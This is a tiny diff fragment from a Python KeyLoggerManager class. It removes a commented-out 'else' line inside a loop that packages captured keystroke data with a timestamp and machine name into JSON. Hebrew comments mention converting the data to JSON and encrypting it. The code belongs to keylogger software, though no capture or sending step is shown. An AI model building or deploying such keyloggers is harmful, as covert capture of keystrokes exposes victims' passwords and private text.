@@ -50,7 +50,7 @@ class KeyLoggerManager(KeyLoggerService):
                 jeson = {'time':time1,'data':list_to_send,'machine':machine}
                 if len(jeson['data']) == 0:
                             continue
-                # else:
+                
                     #jsonהפיכת המילון ל    
                 jeson = json.dumps(jeson,ensure_ascii=False)
                     #jsonהצפנת ה
